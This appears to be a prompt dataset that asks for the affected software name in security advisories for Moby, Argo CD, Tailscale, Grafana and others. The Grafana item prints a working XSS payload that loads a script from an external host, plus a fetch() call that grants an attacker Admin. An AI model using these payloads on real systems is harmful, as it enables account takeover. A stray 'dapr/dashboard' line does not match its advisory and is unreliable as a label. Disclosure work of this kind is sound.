Please identify the software name affected by it. Input: [Moby](https://mobyproject.org/) is an open source container framework developed by Docker Inc. that is distributed as Docker, Mirantis Container Runtime, and various other downstream projects/products. The Moby daemon component (`dockerd`), which is developed as [moby/moby](https://github.com/moby/moby) is commonly referred to as *Docker*.\n\nSwarm Mode, which is compiled in and delivered by default in `dockerd` and is thus present in most major Moby downstreams, is a simple, built-in container orchestrator that is implemented through a combination of [SwarmKit](https://github.com/moby/swarmkit) and supporting network code.\n\nThe `overlay` network driver is a core feature of Swarm Mode, providing isolated virtual LANs that allow communication between containers and services across the cluster. This driver is an implementation/user of [VXLAN](https://en.wikipedia.org/wiki/Virtual_Extensible_LAN), which encapsulates link-layer (Ethernet) frames in UDP datagrams that tag the frame with a VXLAN Network ID (VNI) that identifies the originating overlay network. In addition, the overlay network driver supports an optional, off-by-default encrypted mode, which is especially useful when VXLAN packets traverses an untrusted network between nodes.\n\nEncrypted overlay networks function by encapsulating the VXLAN datagrams through the use of the [IPsec Encapsulating Security Payload](https://en.wikipedia.org/wiki/IPsec#Encapsulating_Security_Payload) protocol in [Transport mode](https://en.wikipedia.org/wiki/IPsec#Transport_mode). By deploying IPSec encapsulation, encrypted overlay networks gain the additional properties of source authentication through cryptographic proof, data integrity through check-summing, and confidentiality through encryption.\n\nWhen setting an endpoint up on an encrypted overlay network, Moby installs three [iptables](https://www.netfilter.org/projects/iptables/index.html) (Linux kernel firewall) rules that enforce both incoming and outgoing IPSec. These rules rely on the `u32` iptables extension provided by the `xt_u32` kernel module to directly filter on a VXLAN packet's VNI field, so that IPSec guarantees can be enforced on encrypted overlay networks without interfering with other overlay networks or other users of VXLAN.\n\nAn [iptables rule](https://github.com/moby/libnetwork/blob/d9fae4c73daf76c3b0f77e14b45b8bf612ba764d/drivers/overlay/encryption.go#L205-L207) designates outgoing VXLAN datagrams with a VNI that corresponds to an encrypted overlay network for IPsec encapsulation.\n\nOn Red Hat Enterprise Linux and derivatives such as CentOS and Rocky, the `xt_u32` module has been:\n* [moved to the kernel-modules-extra package and no longer installed by default in RHEL 8.3](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html/8.3_release_notes/rhel-8-3-0-release#technology-preview_networking)\n* [officially deprecated in RHEL 8.6](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html/8.6_release_notes/deprecated_functionality#deprecated-functionality_networking)\n* [removed completely in RHEL 9](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/9/html/considerations_in_adopting_rhel_9/assembly_networking_considerations-in-adopting-rhel-9#ref_firewall-networking_assembly_networking)\n\nThis rule is not created when `xt_u32` is unavailable, even though the container is still attached to the network.\n\n## Impact\nEncrypted overlay networks on affected platforms silently transmit unencrypted data. As a result, `overlay` networks may appear to be functional, passing traffic as expected, but without any of the expected confidentiality or data integrity guarantees.\n\nIt is possible for an attacker sitting in a trusted position on the network to read all of the application traffic that is moving across the overlay network, resulting in unexpected secrets or user data disclosure. Thus, because many database protocols, internal APIs, etc. are not protected by a second layer of encryption, a user may rely on Swarm encrypted overlay networks to provide confidentiality, which due to this vulnerability is no longer guaranteed.\n\n## Patches\nPatches are available in Moby releases 23.0.3, and 20.10.24. As Mirantis Container Runtime's 20.10 releases are numbered differently, users of that platform should update to 20.10.16.\n\n## Workarounds\n* Close the VXLAN port (by default, UDP port 4789) to outgoing traffic at the Internet boundary (see [GHSA-vwm3-crmr-xfxw](https://github.com/moby/moby/security/advisories/GHSA-vwm3-crmr-xfxw)) in order to prevent unintentionally leaking unencrypted traffic over the Internet.\n* Ensure that the `xt_u32` kernel module is available on all nodes of the Swarm cluster.\n\n## Background\n* [#43382 ](https://github.com/moby/moby/issues/43382)partially discussed this concern, but did not consider the security implications.\n* Mirantis FIELD-5788 essentially duplicates [#43382](https://github.com/moby/moby/issues/43382), and was created six months earlier; it similarly overlooked the security implications.\n* [#45118](https://github.com/moby/moby/pull/45118) is the ancestor of the final patches, and was where the security implications were discovered.\n\n## Related\n* [CVE-2023-28840: Encrypted overlay network may be unauthenticated](https://github.com/moby/moby/security/advisories/GHSA-232p-vwff-86mp)\n* [CVE-2023-28842: Encrypted overlay network with a single endpoint is unauthenticated](https://github.com/moby/moby/security/advisories/GHSA-6wrf-mxfj-pf5p)\n* [GHSA-vwm3-crmr-xfxw: The Swarm VXLAN port may be exposed to attack due to ambiguous documentation](https://github.com/moby/moby/security/advisories/GHSA-vwm3-crmr-xfxw)\n* [GHSA-gvm4-2qqg-m333: Security issues in encrypted overlay networks](https://github.com/moby/libnetwork/security/advisories/GHSA-gvm4-2qqg-m333) (libnetwork).

Please identify the software name affected by it. Input: ### Impact\n\nAll versions of Argo CD starting with v0.5.0 are vulnerable to an information disclosure bug allowing unauthorized users to enumerate application names by inspecting API error messages. An attacker could use the discovered application names as the starting point of another attack. For example, the attacker might use their knowledge of an application name to convince an administrator to grant higher privileges (social engineering).\n\nMany Argo CD API endpoints accept an application name as the only parameter. Since Argo CD RBAC requires both the application name and its configured project name (and, if apps-in-any-namespace is enabled, the application's namespace), Argo CD fetches the requested application before performing the RBAC check. If the application does not exist, the API returns a \"not found\". If the application does exist, and the user does not have access, the API returns an \"unauthorized\" error. By trial and error, an attacker can infer which applications exist and which do not.\n\nNote that application resources are not fetched for API calls from _unauthenticated_ users. If your Argo CD instance is accessible from the public internet, unauthenticated users will not be able to cause Argo CD to make Kubernetes API calls.\n\nThe patch changes API behavior to return \"unauthorized\" both when the application is missing and when the user is not authorized to access it. **This change in API behavior may impact API clients.** Check your code to make sure it will handle the new API behavior properly.\n\n### Patches\n\nA patch for this vulnerability has been released in the following Argo CD versions:\n\n* v2.6.7\n* v2.5.16\n* v2.4.28\n\n### Workarounds\n\nThere are no workarounds besides upgrading.\n\n### Credits\n\nThank you to bean.zhang of HIT-IDS ChunkL Team who discovered the issue and reported it confidentially according to our [guidelines](https://github.com/argoproj/argo-cd/blob/master/SECURITY.md#reporting-a-vulnerability).\n\n### For more information\n\n* Open an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)\n* Join us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd\n.

Input: A vulnerability identified in the implementation of Tailscale SSH in FreeBSD allowed commands to be run with a higher privilege group ID than that specified by Tailscale SSH access rules.\n\n**Affected platforms**: FreeBSD\n\n**Patched Tailscale client versions**: v1.38.2 or later\n\n### What happened?\nA difference in the behavior of the FreeBSD `setgroups` system call from POSIX meant that the Tailscale client running on a FreeBSD-based operating system did not appropriately restrict groups on the host when using Tailscale SSH. When accessing a FreeBSD host over Tailscale SSH, the egid of the tailscaled process was used instead of that of the user specified in Tailscale SSH access rules.\n\n### Who is affected?\n9 tailnets with 22 FreeBSD nodes running Tailscale SSH since Tailscale v1.34 (released on 2022-12-04) may have had Tailscale SSH sessions with a higher privilege group ID than that specified in Tailscale SSH access rules.\n\nWe have notified the affected organizations where we have [security contacts](https://tailscale.com/kb/1224/contact-preferences/#setting-the-security-issues-email).\n\n### What is the impact?\nTailscale SSH commands may have been run with a higher privilege group ID than that specified in Tailscale SSH access rules if they met all of the following criteria:\n* The destination node was a FreeBSD device with Tailscale SSH enabled;\n* Tailscale SSH access rules permitted access for non-root users; and\n* A non-interactive SSH session was used.\n\n### What do I need to do?\nIf you are running Tailscale on FreeBSD, upgrade to v1.38.2 or later to remediate the issue. Admins of a tailnet can view [FreeBSD nodes with unpatched versions](https://login.tailscale.com/admin/machines?q=version%3A%3C1.38.2+freebsd) in the admin console.\n\nTo update the local ports tree in advance of what's available upstream, you can:\n\n1. `cd /usr/ports/security/tailscale`\n2. edit the Makefile to set `PORTVERSION` to `1.38.2`\n3. `make makesum`\n4. `make install`\n\nTailscale SSH on other platforms is not affected.\n\n### Credits\nWe would like to thank [Ryan Belgrave](https://www.linkedin.com/in/rbelgrave/) for reporting this issue.\n\n### References\n* [TS-2023-003](https://tailscale.com/security-bulletins/#ts-2023-003)\n\n\n.

Input: ### Summary\n\nFuzz testing on `crossplane/crossplane`, by Ada Logics and sponsored by the CNCF, identified input to a function in the `fieldpath` package that can cause an out of memory panic. Applications that use the `Paved` type's `SetValue` method with user provided input without proper validation might use excessive amounts of memory and cause an out of memory panic.\n\n### Details\n\nIn the `fieldpath` package, the `SetValue` method of the `Paved` type sets a value on the inner object according to the provided path, without validating it first. This allows setting values in slices at any specific index and the code will grow the target array up to the required size. The index is currently capped at max uint32 (4294967295) given how indexes are parsed,  but that is still an unnecessarily large value.\n\n### Workaround\n\nUsers can parse and validate the path before passing it to the `SetValue` method of the `Paved` type, constraining the index size as deemed appropriate.\n\n### Credits\n\nDisclosed by Ada Logics in a fuzzing audit sponsored by CNCF..

The URL of the intended redirect should always be checked for safety prior to forwarding the user. Other endpoints of the web application already do this, they check both that the domain is using the HTTPS protocol and that it exists on a domain associated with the application.\n\nAn attacker is able to use this unintended functionality to redirect users to malicious sites. This particular security issue allows the attacker to make a phishing attempt seem much more trustworthy to a user of the web application as the initial site before redirection is familiar to them, as well as the actual URL which they have theoretically visited frequently. \n\nWhile this security issue does not directly impact the security of the web application, it is still not an acceptable scenario for the reasons mentioned above. \n\n### Patches\nf0cb75e1e102f95f91e9254c66c797e821857690 fix(handlers): logout redirection validation (#1908) [v4.28.0](https://github.com/authelia/authelia/releases/tag/v4.28.0)\n\n### Workarounds\nUsing a reverse proxy to strip the query parameter from the affected endpoint. \n\n### References\nhttps://github.com/authelia/authelia/pull/1908\n\n[CWE-601](https://cwe.mitre.org/data/definitions/601.html)\n\n[Authelia v4.28.0](https://github.com/authelia/authelia/tree/v4.28.0)\n\n### For more information\nIf you have any questions or comments about this advisory, please [contact us](https://github.com/authelia/authelia#contact-options).

Input: When the user sends a build request that contains a Git URL that contains credentials and the build creates a provenance attestation describing that build, these credentials could be visible from the provenance attestation.\n\nGit URL can be passed in two ways:\n\n1) Invoking build directly from a URL with credentials.\n\n```\nbuildctl build --frontend dockerfile.v0 --context https://<credentials>@url/repo.git\n```\n\nEquivalent in `docker buildx` would be\n\n```\ndocker buildx build https://<credentials>@url/repo.git\n```\n\n2) If the client sends additional VCS info hint parameters on builds from a local source.

Input: ### Summary\nA vulnerability was identified in Nomad and Nomad Enterprise (\u201cNomad\u201d) such that a user with the submit-job ACL capability can submit a job that can escalate to management-level privileges. This vulnerability, CVE-2023-1299, was introduced in Nomad 1.5.0 and fixed in Nomad 1.5.1.\n\n### Background\nNomad 1.4.0 introduced the concept of workload identity so that tasks can access variables without needing to access them through Nomad HTTP API with an ACL token.\n\nIn 1.5.0, the identity block was introduced, which exposes the workload identity token to the workload so it can access Nomad HTTP API via a unix domain socket without configuring mTLS.\n\n### Details\nDuring internal testing, we discovered it was possible to abuse the workload identity to elevate to management-level privilege if the workload identity did not have any attached ACL policies.\n\n### Remediation\nCustomers should evaluate the risk associated with this issue and consider upgrading to Nomad 1.5.1 or newer.

When a Composition is selected for a Composite Resource, patches are evaluated and if a specified index is greater than the current size of the target slice, that slice's size will be increased to the specified index, which could lead to an excessive amount of memory usage and therefore the Pod being OOM-Killed. The index is already capped to the maximum value for a uint32 (4294967295) when parsed, but that is still an unnecessarily large value.\n\n### Workaround\n\nUsers can restrict write privileges on Compositions to only admin users as a workaround..

Once a function is selected, a small tooltip will be shown when hovering over the name of the function. This tooltip will allow you to delete the selected Function from your query or show the Function Description. However, no sanitization is done when adding this description to the DOM. Since it is not uncommon to connect to public data sources, and attacker could host a Graphite instance with modified Function Descriptions containing XSS payloads. When the victim uses it in a query and accidentally hovers over the Function Description, an attacker controlled XSS payload will be executed. This can be used to add the attacker as an Admin for example. \n\n### Details\n\n1. Spin up your own Graphite instance. I've done this using the `make devenv sources=graphite`.\n2. Now start a terminal for your Graphite container and modify the following file `/opt/graphite/webapp/graphite/render/functions.py` \n3. Basically you can pick any function but I picked the `aggregateSeriesLists` function. Modify its description to be `\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vY20yLnRlbCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))>`\n\nThe result would look like this:\n\n```python\ndef aggregateSeriesLists(requestContext, seriesListFirstPos, seriesListSecondPos, func, xFilesFactor=None):\n  \"\"\"                                                                              \n                                                                                              \n  \"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vY20yLnRlbCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))>\n                                                                           \n  \"\"\"                  \n  if len(seriesListFirstPos) != len(seriesListSecondPos):   \n    raise InputParameterError(             \n      \"seriesListFirstPos and seriesListSecondPos argument must have equal length\")\n  results = []                                          \n                                    \n  for i in range(0, len(seriesListFirstPos)):        \n    firstSeries = seriesListFirstPos[i]                                           \n    secondSeries = seriesListSecondPos[i]         \n    aggregated = aggregate(requestContext, (firstSeries, secondSeries), func, xFilesFactor=xFilesFactor) \n    if not aggregated: # empty list, no data found                          \n      continue                   \n    result = aggregated[0]  # aggregate() can only return len 1 list           \n    result.name = result.name[:result.name.find('Series(')] + 'Series(%s,%s)' % (firstSeries.name, secondSeries.name)\n    results.append(result)                                                                           \n  return results                                                         \n                                                                                                                   \n                                                                                                       \naggregateSeriesLists.group = 'Combine'                                                             \naggregateSeriesLists.params = [\n  Param('seriesListFirstPos', ParamTypes.seriesList, required=True),\n  Param('seriesListSecondPos', ParamTypes.seriesList, required=True),\n  Param('func', ParamTypes.aggFunc, required=True),                                                       \n  Param('xFilesFactor', ParamTypes.float),                                \n]                                                                                                \n```\n\n4. Save and quit the file. Restart your Graphite Container (I did this using the Restart Icon in Docker Desktop)\n5. Now login to your Grafana instance as an Organisation Admin.\n6. Navigate to http://[grafana]/plugins/graphite and click `Create a Graphite data source`\n7. Add the url to the attackers Graphite instance (maybe enable `Skip TLS Verify`) and click `Save & test` and `Explore`\n8. In the newly opened page click the + icon next to `Functions` and search for `aggregateSeriesLists` and click it to add it.\n9. Now hover over `aggregateSeriesLists` with your mouse and move your mouse to the `?` icon.\n\n### Result\n\nOur payload will trigger and in this case it will include an external script to trigger the alerts.\n\n#### Decoded payload\n\n```javascript\nvar a=document.createElement(\"script\");a.src=\"https://cm2.tel\";document.body.appendChild(a);\n```\n\n![image](https://user-images.githubusercontent.com/26874824/225035735-5d00e5d9-3302-4257-8f95-dd562e752893.png)\n\n\n### Impact\n\nIn the POC we've picked 1 function to have a XSS payload, but a real attacker would of course maximize the likelihood by replacing all of it's descriptions with XSS payloads. As shown above the attacker can now run arbitrary javascript in the browser of the victim. The victim can be any user using the malicious Graphite instance in a query (or while Exploring), including the Organisation Admin. If so, an attacker could include a payload to add them as an admin themselves.\n\nAn example would be something like this:\n\n```javascript\nfetch(\"/api/org/invites\", {\n  \"headers\": {\n    \"content-type\": \"application/json\"\n  },\n  \"body\": \"{\\\"name\\\":\\\"\\\",\\\"email\\\":\\\"\\\",\\\"role\\\":\\\"Admin\\\",\\\"sendEmail\\\":true,\\\"loginOrEmail\\\":\\\"hacker@hacker.com\\\"}\",\n  \"method\": \"POST\",\n  \"credentials\": \"include\"\n});\n```\n\n### Mitigation\n\nThe vulnerability seems to occur in the following file: public\\app\\plugins\\datasource\\graphite\\components\\FunctionEditorControls.tsx\n\n```typescript\nconst FunctionDescription = React.lazy(async () => {\n  // @ts-ignore\n  const { default: rst2html } = await import(/* webpackChunkName: \"rst2html\" */ 'rst2html');\n  return {\n    default(props: { description?: string }) {\n      return <div dangerouslySetInnerHTML={{ __html: rst2html(props.description ?? '') }} />;\n    },\n  };\n});\n```\n\nIn many other similar cases, some form of sanitization is used. I would advise to use the same here as rst2html itself will just leave HTML untouched when parsing the expected reStructuredText from Graphite. So now when it is applied using dangerouslySetInnerHTML our XSS payload will survive.. Top 1 search result is go:github.com/dapr/dashboard.

Input: ### Impact\n\nIf a malicious user has taken over a Kubernetes node where virt-handler (the KubeVirt node-daemon) is running, the virt-handler service account can be used to modify all node specs.\n\nThis can be misused to lure-in system-level-privileged components (which can for instance read all secrets on the cluster, or can exec into pods on other nodes). This way a compromised node can be used to elevate privileges beyond the node until potentially having full privileged access to the whole cluster.\n\nThe simplest way to exploit this, once a user could compromise a specific node, is to set with the virt-handler service account all other nodes to unschedulable and simply wait until system-critical components with high privileges appear on its node.\n\nSince this requires a node to be compromised first, the severity of this finding is considered Medium.\n\n### Patches\n\nNot yet available.\n\n### Workarounds\nGatekeeper users can add a webhook which will block the `virt-handler` service account to modify the spec of a node.\n\nAn example policy, preventing virt-handler from changing the node spec may look like this:\n\n```yaml\napiVersion: templates.gatekeeper.sh/v1\nkind: ConstraintTemplate\nmetadata:\n  name: virthandlerrestrictions\nspec:\n[...]\n  targets:\n    - libs:\n        - |         \n[...]          \n          is_virt_handler(username) {\n              username == \"system:serviceaccount:kubevirt:virt-handler\"\n          }\n          mutates_node_in_unintended_way {\n            # TODO\n            # only allow kubevirt.io/ prefixed metadata node changes\n          }\n      rego: |\n[...]\n        \n        violation[{\"msg\": msg}] {\n          is_virt_handler(username)\n          mutates_node_in_unintended_way(input.review.object, input.review.oldObject)\n          msg := sprintf(\"virt-handler tries to modify node <%v> in an unintended way.\", [input.review.object.name])\n        }\n```\n\nand applying this template to node modifications.\n\n\n### Credits\n\nSpecial thanks to the discoverers of this issue:\n\nNanzi Yang (nzyang@stu.xidian.edu.cn)\nXin Guo (guox@stu.xidian.edu.cn)\nJietao Xiao (jietaoXiao@stu.xidian.edu.cn)\nWenbo Shen (shenwenbo@zju.edu.cn)\nJinku Li (jkli@xidian.edu.cn)\n\n### References\n\nhttps://github.com/kubevirt/kubevirt/issues/9109.

Input: ### Impact\n\nAll Argo CD versions starting with v2.3.0-rc1 are vulnerable to an improper authorization bug which allows users who have the ability to update at least one cluster secret to update any cluster secret.\n\nThe attacker could use this access to escalate privileges (potentially controlling Kubernetes resources) or to break Argo CD functionality (by preventing connections to external clusters).\n\n#### How the Attack Works\n\nArgo CD stores [cluster access configurations](https://argo-cd.readthedocs.io/en/stable/operator-manual/declarative-setup/#clusters) as Kubernetes Secrets. To take advantage of the vulnerability, an attacker must know the server URL for the cluster secret they want to modify. \n\nThe attacker must be authenticated with the Argo CD API server, and they must be authorized to update at least one ([non project-scoped](https://argo-cd.readthedocs.io/en/stable/user-guide/projects/#project-scoped-repositories-and-clusters)) cluster. Then they must craft a malicious request to the Argo CD API server.\n\n#### Removing Deployment Restrictions\n\nA cluster Secret's `clusterResources` field determines whether Argo CD users may deploy cluster-scoped resources to that cluster. The `namespaces` field determines the namespaces to which Argo CD users may deploy resources.\n\nYou can use this command to determine whether any of your cluster configurations employ these restrictions (replace `argocd` with the namespace of your Argo CD installation):\n\n```shell\nkubectl get secret -n argocd -l 'argocd.argoproj.io/secret-type=cluster' -ojson | jq '.items |\n  map(.data |= with_entries(.value |= @base64d)) |  # base64-decode secrets\n  map(select(.data | (\n    (.clusterResources != null and .clusterResources == \"false\") or # we deny cluster-scoped resource management\n    (.namespaces != null and .namespaces != \"\")                     # we are only managing certain clusters\n  )) | .metadata.name)'\n```\n\nThe `clusterResources` and `namespaces` fields are one line of defense against unauthorized management of Kubernetes resources. Users should also have AppProject and RBAC restrictions in place.\n\nIf `clusterResources: \"false\"` or `namespaces: \"some,namespaces\"` are the _only_ mechanisms preventing an attacker from maliciously managing certain resources via Argo CD, then this vulnerability could allow that attacker to manage out-of-bounds resources via Argo CD (create, get, update, delete).\n\n#### Modifying Connection Parameters\n\nCluster secrets also hold client configuration for connecting to the remote cluster. One option is to skip TLS certificate verification. An attacker could disable certificate verification in an effort to achieve a malicious-in-the-middle (MITM) attack.\n\nAlternatively, an attacker could apply an invalid configuration (for example, by setting an invalid bearer token) and achieve a denial-of-service by preventing Argo CD from managing the target cluster.\n\n#### Changing Unscoped Clusters to be Scoped\n\nThe vulnerability also allows an attacker to modify a previously-unscoped cluster and make it [scoped](https://argo-cd.readthedocs.io/en/stable/user-guide/projects/#project-scoped-repositories-and-clusters). This is important if you are using `permitOnlyProjectScopedClusters: true` in a project under which the attacker can deploy. By scoping a previously-unscoped cluster under that project, they can grant themselves the ability to manage resources on the target cluster.\n\n### Patches\n\nA patch for this vulnerability has been released in the following Argo CD versions:\n\n* v2.6.2\n* v2.5.11\n* v2.4.23\n* v2.3.17\n\n### Workarounds\n\nThe best way to mitigate the vulnerability is to upgrade. The following two sections explain other ways to mitigate the vulnerability if you are currently unable to upgrade.\n\n#### Limit Users with Cluster Update Access\n\nThe only complete mitigation besides upgrading is to modify your RBAC configuration to completely revoke all `clusters, update` access.\n\nTo exploit this vulnerability, an attacker must have access to update at least one cluster configuration. Check your [RBAC configuration](https://argo-cd.readthedocs.io/en/stable/operator-manual/rbac/), for lines like this:\n\n```\np, role:developers, clusters, update, *, allow\np, role:developers, clusters, *, *, allow\np, role:developers, *, update, *, allow\n```\n\nRevoke `clusters, update` access for any users who do not absolutely need that access.\n\n#### Restrict Resource Management via AppProjects and RBAC\n\n[AppProjects](https://argo-cd.readthedocs.io/en/stable/user-guide/projects/#projects) are a primary tool to restrict what resources may be managed via Argo CD.\n\nYou can use the `destinations` and `clusterResourceWhitelist` fields to apply similar restrictions as the `namespaces` and `clusterResources` fields described above.\n\n```yaml\napiVersion: argoproj.io/v1alpha1\nkind: AppProject\nspec:\n  destinations:\n  # Only allow Applications managed by this AppProject to manage to the `allowed-namespace` namespace.\n  - namespace: 'allowed-namespace'\n    server: 'https://your-server'\n  # Do not allow Applications managed by this AppProject to manage any cluster-scoped resources.\n  clusterResourceWhitelist: []\n```\n\nAlong with adding AppProject restrictions, make sure that your RBAC restrictions are strict enough.\n\nFor example, limit `projects, update` access to Argo CD administrators only. Also use the `{project}` field in `applications, *, {project}/{application}` field to limit users' access to certain, restricted, AppProjects. \n\nAppProject restrictions can only prevent Applications from managing out-of-bounds resources. It cannot prevent an attacker from maliciously changing cluster connection TLS configuration.\n\n### For more information\n\n* Open an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)\n* Join us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd\n.

Please identify the software name affected by it. Input: A password disclosure flaw was found in Syft versions v0.69.0 and v0.69.1. This flaw leaks the password stored in the SYFT_ATTEST_PASSWORD environment variable.\n\n### Impact\nThe `SYFT_ATTEST_PASSWORD` environment variable is for the `syft attest` command to generate attested SBOMs for the given container image. This environment variable is used to decrypt the private key (provided with `syft attest --key <path-to-key-file>`)  during the signing process while generating an SBOM attestation. \n\nThis vulnerability affects users running syft that have the `SYFT_ATTEST_PASSWORD` environment variable set with credentials (regardless of if the attest command is being used or not). Users that do not have the environment variable `SYFT_ATTEST_PASSWORD` set are not affected by this issue.\n\nThe credentials are leaked in two ways:\n- in the syft logs when `-vv` or `-vvv` are used in the syft command (which is any log level >= `DEBUG`)\n- in the attestation or SBOM only when the `syft-json` format is used \n\nNote that as of v0.69.0 any generated attestations by the `syft attest` command are uploaded to the OCI registry (if you have write access to that registry) in the same way `cosign attach` is done. This means that any attestations generated for the affected versions of syft when the `SYFT_ATTEST_PASSWORD` environment variable was set would leak credentials in the attestation payload uploaded to the OCI registry.\n\nExample commands run from affected versions of syft that show the credential disclosure:\n```bash\n$ SYFT_ATTEST_PASSWORD=123456 syft <container-image-or-directory-input> -o syft-json | grep 123456\n# \"123456\" is in the output\n\n$ SYFT_ATTEST_PASSWORD=123456 syft attest <container-image-input> -o syft-json \n$ cosign download attestation <container-image-input> | jq -r '.payload' | base64 -d | grep 123456\n# \"123456\" is in the output\n```\n\n### Patches\n\nThe patch has been released in v0.70.0.\n\n### Workarounds\n\nThere are no workarounds for this vulnerability.\n\n### References\n\nPatch pull request: https://github.com/anchore/syft/pull/1538.

The metric instruments do not \"forget\" previous measurement attributes when `cumulative` temporality is used, this means the cardinality of the measurements allocated is directly correlated with the unique URIs handled.

Please identify the software name affected by it. Input: ### Impact\nAll versions of Argo CD starting with v2.6.0-rc1 have an output sanitization bug which leaks repository access credentials in error messages. These error messages are visible to the user, and they are logged. The error message is visible when a user attempts to create or update an Application via the Argo CD API (and therefor the UI or CLI). The user must have `applications, create` or `applications, update` RBAC access to reach the code which may produce the error.\n\nThe user is not guaranteed to be able to trigger the error message. They may attempt to spam the API with requests to trigger a rate limit error from the upstream repository. \n\nIf the user has `repositories, update` access, they may edit an existing repository to introduce a URL typo or otherwise force an error message. But if they have that level of access, they are probably intended to have access to the credentials anyway.\n\n### Patches\n\nA patch for this vulnerability has been released in the following Argo CD version:\n\n* v2.6.1\n\n### Workarounds\n\nThe only way to completely resolve the issue is to upgrade.\n\n#### Mitigations\n\nTo mitigate the issue, make sure that your repo credentials have only least necessary privileges. For example, the credentials should not have push access, and they should not have access to more resources than what Argo CD actually needs (for example, a whole GitHub org when only one repo is needed).\n\nTo further mitigate the impact of a leaked write-capable repo credential, you could [enable commit signature verification](https://argo-cd.readthedocs.io/en/stable/user-guide/gpg-verification/#enforcing-signature-verification). Even if someone could push a malicious commit, the commit would not by synced.\n\nYou should also enforce least privileges in Argo CD RBAC. Make sure users only have `repositories, update`, `applications, update`, or `applications, create` access if they absolutely need it.\n\n### References\n\n* The problem was initially reported in a [GitHub issue](https://github.com/argoproj/argo-cd/issues/12309)\n* [Argo CD RBAC configuration documentation](https://argo-cd.readthedocs.io/en/stable/operator-manual/rbac/)\n\n### For more information\n\n* Open an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)\n* Join us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd\n.

Input: ### Impact\nSince [ydb-go-sdk/v3.48.6](https://github.com/ydb-platform/ydb-go-sdk/blob/v3.48.6/internal/balancer/balancer.go#L71) if you use a custom credentials object (implementation of interface [Credentials](https://github.com/ydb-platform/ydb-go-sdk/blob/master/credentials/credentials.go#L10)) it may leak into logs. This happens because this object could be serialized into an error message using `fmt.Errorf(\"something went wrong (credentials: %q)\", credentials)` during connection to the YDB server. Printf func use placeholder `%q` for string representation of argument with quotes. If an argument implements interface `fmt.Stringer`, it will used through `String()` func. In other cases used fallback - serialization with reflection.\n\nIf such logging occurred, a  malicious user with access to logs could read sensitive information (i.e. credentials) information and use it to get access to the database.\n\nWho is impacted: applications with custom credentials object with an explicit token field.\n\nA leak could have occurred if all of these conditions were met simultaneously:\n1) The credentials object does not implement the `fmt.Stringer` interface (does not have a `String()` method) - potentially these are custom credentials. Official credentials have a `String()` method.\n2) There was an error connecting to YDB during driver creation via `ydb.Open(...)`.\n3) Some logging system was configured (`ydb-go-sdk` does not log such errors by default).\n4) The connection error was logged into a system that a malicious user had access to.\n\n### Patches\n`ydb-go-sdk` contains this problem in versions from v3.48.6 to v3.53.2. The fix for this problem has been released in version v3.53.3 ([PR](https://github.com/ydb-platform/ydb-go-sdk/pull/859)).\n\n### Workarounds\nImplement the `fmt.Stringer` interface in your custom credentials type with explicit stringify of object state..

Input: ### Summary\n\nThis handler wrapper https://github.com/open-telemetry/opentelemetry-go-contrib/blob/5f7e6ad5a49b45df45f61a1deb29d7f1158032df/instrumentation/net/http/otelhttp/handler.go#L63-L65\nout of the box adds labels\n\n- `http.user_agent`\n- `http.method`\n\nthat have unbound cardinality. It leads to the server's potential memory exhaustion when many malicious requests are sent to it.\n\n### Details\n\nHTTP header User-Agent or HTTP method for requests can be easily set by an attacker to be random and long. The library internally uses [httpconv.ServerRequest](https://github.com/open-telemetry/opentelemetry-go/blob/v1.12.0/semconv/internal/v2/http.go#L159) that records every value for HTTP [method](https://github.com/open-telemetry/opentelemetry-go/blob/38e1b499c3da3107694ad2660b3888eee9c8b896/semconv/internal/v2/http.go#L204) and [User-Agent](https://github.com/open-telemetry/opentelemetry-go/blob/38e1b499c3da3107694ad2660b3888eee9c8b896/semconv/internal/v2/http.go#L223).\n\n### PoC\n\nSend many requests with long randomly generated HTTP methods or/and User agents (e.g. a million) and observe how memory consumption increases during it.\n\n### Impact\n\nIn order to be affected, the program has to configure a metrics pipeline, use [otelhttp.NewHandler](https://github.com/open-telemetry/opentelemetry-go-contrib/blob/5f7e6ad5a49b45df45f61a1deb29d7f1158032df/instrumentation/net/http/otelhttp/handler.go#L63-L65) wrapper, and does not filter any unknown HTTP methods or User agents on the level of CDN, LB, previous middleware, etc.\n\n### Others\n\nIt is similar to already reported vulnerabilities\n- https://github.com/open-telemetry/opentelemetry-go-contrib/security/advisories/GHSA-5r5m-65gx-7vrh ([open-telemetry/opentelemetry-go-contrib](https://github.com/open-telemetry/opentelemetry-go-contrib))\n- https://github.com/advisories/GHSA-cg3q-j54f-5p7p ([prometheus/client_golang](https://github.com/prometheus/client_golang))\n\n### Workaround for affected versions\n\nAs a workaround to stop being affected [otelhttp.WithFilter()](https://pkg.go.dev/go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp/filters) can be used, but it requires manual careful configuration to not log certain requests entirely.\n\nFor convenience and safe usage of this library, it should by default mark with the label `unknown` non-standard HTTP methods and User agents to show that such requests were made but do not increase cardinality. In case someone wants to stay with the current behavior, library API should allow to enable it.\n\nThe other possibility is to disable HTTP metrics instrumentation by passing [`otelhttp.WithMeterProvider`](https://pkg.go.dev/go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp#WithMeterProvider) option with [`noop.NewMeterProvider`](https://pkg.go.dev/go.opentelemetry.io/otel/metric/noop#NewMeterProvider).\n\n### Solution provided by upgrading\n\nIn PR https://github.com/open-telemetry/opentelemetry-go-contrib/pull/4277, released with package version 0.44.0, the 